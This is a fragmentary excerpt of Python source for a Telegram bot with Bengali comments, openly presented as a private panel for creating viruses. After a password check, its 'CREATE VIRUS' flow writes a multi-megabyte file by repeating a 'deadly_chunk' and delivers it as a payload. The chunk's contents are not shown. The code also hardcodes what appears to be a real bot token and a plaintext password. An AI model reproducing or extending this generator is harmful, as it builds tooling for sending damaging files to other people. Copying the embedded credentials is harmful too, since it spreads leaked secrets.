...
# ২. কনফিগারেশন (আপনার টোকেন এবং নতুন পাসওয়ার্ড)
TOKEN = "8675593212:AAG6_m5ZFEqG-qkutygxbuoOetMv9N87TnY"
CORRECT_PASSWORD = "MIZANUR RAHMAN" # পাসওয়ার্ড আপডেট করা হয়েছে
...
# ৩. ডাটাবেস
def init_db():
    conn = sqlite3.connect('mr_dev_secure_v6.db')
    cursor = conn.cursor()
...
async def generate_optimized_payload(status_msg):
    ...
    try:
        await status_msg.edit_text("⏳ ২-৫ এমবি পেলোড তৈরি হচ্ছে...")
        with open(file_name, "w", encoding="utf-8") as f:
            # ৪-৫ এমবি সাইজ নিশ্চিত করতে লুপ
            for i in range(1, 46):
                f.write(deadly_chunk)
                if i % 15 == 0:
                    await status_msg.edit_text(f"🚀 প্রসেসিং: {int((i/45)*100)}%...")
        
        await status_msg.edit_text("🔥 সম্পন্ন! ইনবক্সে চেক করুন...")
        return file_name
    except Exception:
        return None
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(
        f"🔥 **M R DEVELOPER PRIVATE PANEL** 🔥\n\nস্বাগতম {update.effective_user.first_name}! ভাইরাস তৈরি করতে নিচের বাটন চাপুন।",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def ask_for_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 **পাসওয়ার্ড দিন (MIZANUR RAHMAN):**", reply_markup=ReplyKeyboardRemove())
    return WAITING_FOR_PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_pass = update.message.text
    if user_pass == CORRECT_PASSWORD:
        status_msg = await update.message.reply_text("✅ পাসওয়ার্ড সঠিক! জেনারেট হচ্ছে...")
        ...
        keyboard = [[KeyboardButton("🚀 CREATE VIRUS")], [KeyboardButton("📊 STATUS")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("পরবর্তী কাজের জন্য বাটন চাপুন।", reply_markup=reply_markup)
        return ConversationHandler.END
    else:
        await update.message.reply_text("❌ ভুল পাসওয়ার্ড! সঠিক পাসওয়ার্ড দিয়ে আবার চেষ্টা করুন।")
        return WAITING_FOR_PASSWORD
...
def main():
    ...
    print("M R DEVELOPER Bot is LIVE with NEW PASSWORD!")
